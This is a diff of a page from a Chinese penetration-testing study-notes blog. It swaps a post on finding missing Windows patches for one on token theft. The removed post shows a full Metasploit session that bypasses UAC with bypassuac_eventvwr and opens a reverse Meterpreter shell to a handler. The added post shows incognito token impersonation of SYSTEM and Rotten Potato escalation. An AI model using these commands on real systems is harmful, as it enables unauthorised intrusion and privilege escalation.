@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【内网学习笔记】14、发现主机缺失补丁, Teams Six">
+    <meta name="keywords" content="【内网学习笔记】17、令牌窃取, Teams Six">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【内网学习笔记】14、发现主机缺失补丁 | Teams Six</title>
+    <title>【内网学习笔记】17、令牌窃取 | Teams Six</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【内网学习笔记】14、发现主机缺失补丁</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】17、令牌窃取</h1>
                 </div>
             </div>
         </div>
@@ -413,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-06
+                    2021-07-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-06
+                    2021-07-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    369
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    1 分
                 </div>
                 
 
@@ -449,132 +449,24 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p>
-<h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p>
-<pre><code>C:\Users\teamssix&gt; systeminfo
-……内容过多，此处省略……
-修补程序: 安装了 2 个修补程序。
-         [01]: KB2999226
-         [02]: KB976902
-……内容过多，此处省略……</code></pre>
-<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p>
-<pre><code>wmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre>
-<pre><code>C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOn
-
-Caption                                     Description  HotFixID   InstalledOn
-http://support.microsoft.com/?kbid=2999226  Update       KB2999226  11/26/2020
-http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010</code></pre>
-<p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p>
-<h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p>
-<p>Sherlock 项目地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
-<p>导入脚本</p>
-<pre><code>Import-Module .\Sherlock.ps1</code></pre>
-<p>Sherlock 命令</p>
-<pre><code>Find-ALLVulns    搜索所有未安装的补丁
-Find-MS16032    搜索单个漏洞</code></pre>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p>
-<pre><code>msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches
-
-msf6 post(windows/gather/enum_patches) &gt; set session 1
-session =&gt; 1
-
-msf6 post(windows/gather/enum_patches) &gt; run
-[+] KB2999226 installed on 11/26/2020
-[+] KB976902 installed on 11/21/2010
-[*] Post module execution completed</code></pre>
-<p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p>
-<p>首先查看下当前会话权限</p>
-<pre><code>msf6 post(windows/gather/enum_patches) &gt; sessions 1
-[*] Starting interaction with 1...
-
-meterpreter &gt; execute -if &quot;whoami /groups&quot;
-Process 3048 created.
-Channel 6 created.
-
-组信息
------------------
-
-组名                                   类型   SID          属性
-====================================== ====== ============ ==============================
-Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
-BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组
-BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
-NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
-控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
-NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
-NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
-LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
-NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
-Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组</code></pre>
-<p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p>
-<p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p>
-<pre><code>meterpreter &gt; background
-[*] Backgrounding session 1...
-
-msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester
-msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1
-session =&gt; 1
-msf6 post(multi/recon/local_exploit_suggester) &gt; run
-
-[*] 172.16.214.4 - Collecting local exploits for x86/windows...
-[*] 172.16.214.4 - 38 exploit checks are being tried...
-[+] 172.16.214.4 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-[*] Post module execution completed</code></pre>
-<p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p>
-<pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/bypassuac_eventvwr
-[*] Using configured payload windows/meterpreter/reverse_tcp
-
-msf6 exploit(windows/local/bypassuac_eventvwr) &gt; set session 1
-session =&gt; 1
-
-msf6 exploit(windows/local/bypassuac_eventvwr) &gt; run
-[*] Started reverse TCP handler on 10.101.22.38:4444
-[*] UAC is Enabled, checking level...
-[+] Part of Administrators group! Continuing...
-[+] UAC is set to Default
-[+] BypassUAC can bypass this setting, continuing...
-[*] Configuring payload and stager registry keys ...
-[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
-[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
-[*] Sending stage (175174 bytes) to 172.16.214.4
-[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800
-[*] Cleaning up registry keys ...
-
-meterpreter &gt; execute -if &quot;whoami /groups&quot;
-Process 3048 created.
-Channel 1 created.
-
-组信息
------------------
-
-组名                                 类型   SID          属性
-==================================== ====== ============ ==========================================
-Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
-BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者
-BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
-NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
-控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
-NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
-NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
-LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
-NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
-Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组</code></pre>
-<p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p>
-<h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p>
-<p>wesng 的安装方法也很简单</p>
-<pre><code>git clone https://github.com/bitsadmin/wesng.git
-cd wesng
-python wes.py --update</code></pre>
-<p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p>
-<pre><code>systeminfo &gt; info.txt</code></pre>
-<p>直接使用 wesng 即可</p>
-<pre><code>python wes.py info.txt</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png"></p>
-<p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p>
+                <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p>
+<pre><code>load incognito
+list_tokens -u</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729095721.png"></p>
+<p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p>
+<p>令牌获取的数量取决于获取到 Shell 的权限等级。</p>
+<p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p>
+<pre><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100415.png"></p>
+<p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p>
+<p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100653.png"></p>
+<h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p>
+<p>Rotten Potato 项目地址：<a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
+<p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png"></p>
 <blockquote>
-<p>参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
@@ -603,7 +495,7 @@ python wes.py --update</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/year/210706-155005.html">https://www.teamssix.com/year/210706-155005.html</a>
+                    <a href="https://www.teamssix.com/year/210729-110334.html">https://www.teamssix.com/year/210729-110334.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -696,7 +588,7 @@ python wes.py --update</code></pre>
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2021-07-06T15-50-05',
+        id: '2021-07-29T11-03-34',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -720,29 +612,30 @@ python wes.py --update</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/210722-173157.html">
+                <a href="/year/210729-110334.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png" class="responsive-img" alt="【内网学习笔记】15、系统服务权限配置不当利用">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png" class="responsive-img" alt="【内网学习笔记】17、令牌窃取">
                         
-                        <span class="card-title">【内网学习笔记】15、系统服务权限配置不当利用</span>
+                        <span class="card-title">【内网学习笔记】17、令牌窃取</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PowerUpPowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
-在 
+                            0、前言令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。
+1、MSF在获取到 Meterpreter Shell 后，使用以下命令
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -755,6 +648,7 @@ python wes.py --update</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -781,24 +675,23 @@ python wes.py --update</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/210701-161347.html">
+                <a href="/year/210728-145329.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png" class="responsive-img" alt="【内网学习笔记】13、内网中绕过无法上传文件限制">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png" class="responsive-img" alt="【内网学习笔记】16、组策略凭据获取">
                         
-                        <span class="card-title">【内网学习笔记】13、内网中绕过无法上传文件限制</span>
+                        <span class="card-title">【内网学习笔记】16、组策略凭据获取</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            1、前言有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。
-2、Power
+                            0、前言SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Window
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-28
                             </span>
                         <span class="publish-author">
                             
